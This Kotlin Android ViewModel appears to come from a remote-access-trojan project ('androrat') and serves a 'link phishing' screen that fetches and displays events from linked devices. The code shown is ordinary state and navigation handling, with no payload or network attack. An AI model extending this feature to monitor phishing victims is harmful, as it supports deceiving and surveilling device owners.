package com.ierusalem.androrat.features.link_phishing.domain

import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.ierusalem.androrat.core.ui.navigation.DefaultNavigationEventDelegate
import com.ierusalem.androrat.core.ui.navigation.NavigationEventDelegate
import com.ierusalem.androrat.core.ui.navigation.emitNavigation
import com.ierusalem.androrat.core.utils.Resource
import com.ierusalem.androrat.core.utils.log
import com.ierusalem.androrat.features.link_phishing.data.LinkPhishingRepository
import com.ierusalem.androrat.features.link_phishing.data.model.EventsModel
import com.ierusalem.androrat.features.link_phishing.presentation.LinkPhishingEvents
import com.ierusalem.androrat.features.link_phishing.presentation.LinkPhishingNavigation
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.CoroutineExceptionHandler
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import javax.inject.Inject

@HiltViewModel
class LinkPhishingViewModel @Inject constructor(
    private val linkPhishingRepository: LinkPhishingRepository
) : ViewModel(),
    NavigationEventDelegate<LinkPhishingNavigation> by DefaultNavigationEventDelegate() {

    private val _uiState = MutableStateFlow(LinkPhishingUiState())
    val uiState: StateFlow<LinkPhishingUiState> = _uiState.asStateFlow()

    private val coroutineExceptionHandler = CoroutineExceptionHandler { _, throwable ->
        throwable.printStackTrace()
        _uiState.value = _uiState.value.copy(
            devices = Resource.Failure("Some thing went wrong!")
        )
    }

    init {
        getLinkEvents()
    }

    private fun getLinkEvents() {
        viewModelScope.launch(coroutineExceptionHandler + Dispatchers.IO) {
            linkPhishingRepository.getLinkedDevices().let { devices ->
                if (devices.isSuccessful) {
                    log("success - ${devices.body().toString()}")
                    _uiState.value = _uiState.value.copy(
                        devices = Resource.Success(devices.body()!!)
                    )
                } else {
                    log("error - ${devices.message()}")
                    _uiState.value = _uiState.value.copy(
                        devices = Resource.Failure(devices.message())
                    )
                }
            }
        }
    }

    fun onEvent(event: LinkPhishingEvents) {
        when (event) {
            LinkPhishingEvents.OnNavIconClick -> {
                emitNavigation(LinkPhishingNavigation.OnNavIconClick)
            }
        }
    }
}

data class LinkPhishingUiState(
    val devices: Resource<EventsModel> = Resource.Loading()
)
